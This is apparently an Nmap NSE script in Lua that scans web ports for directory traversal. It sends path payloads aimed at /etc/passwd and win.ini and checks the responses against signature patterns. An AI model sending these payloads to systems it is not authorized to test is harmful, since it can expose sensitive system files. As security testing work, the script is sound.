local nmap = require("nmap")
local stdnse = require("stdnse")
local http = require("http")

description = [[
Tests for directory traversal vulnerabilities by sending common
traversal sequences and checking for sensitive file content in responses.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"safe", "default"}

portrule = function(host, port)
    return port.protocol == "tcp" and
           (port.service == "http" or port.service == "https" or
            port.number == 80 or port.number == 443 or port.number == 8080)
end

local payloads = {
    "/../../../etc/passwd",
    "/..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/....//....//....//etc/passwd",
    "/../../../windows/win.ini",
    "/..%2f..%2f..%2f..%2fwindows%2fwin.ini",
}

local patterns = {
    "root:.*:0:0:",
    "%[fonts%]",
    "daemon:.*:1:",
}

action = function(host, port)
    local output = {}
    local vulnerabilities = {}

    for _, payload in ipairs(payloads) do
        local response = http.get(host, port, payload)
        if response and response.status == 200 and response.body then
            for _, pattern in ipairs(patterns) do
                if response.body:find(pattern) then
                    table.insert(vulnerabilities, "Path traversal with: " .. payload)
                    break
                end
            end
        end
    end

    if #vulnerabilities > 0 then
        table.insert(output, "CRITICAL: Directory Traversal Vulnerabilities Found:")
        for _, vuln in ipairs(vulnerabilities) do
            table.insert(output, "  " .. vuln)
        end
    else
        table.insert(output, "No directory traversal vulnerabilities detected")
    end

    return stdnse.format_output(true, output)
end
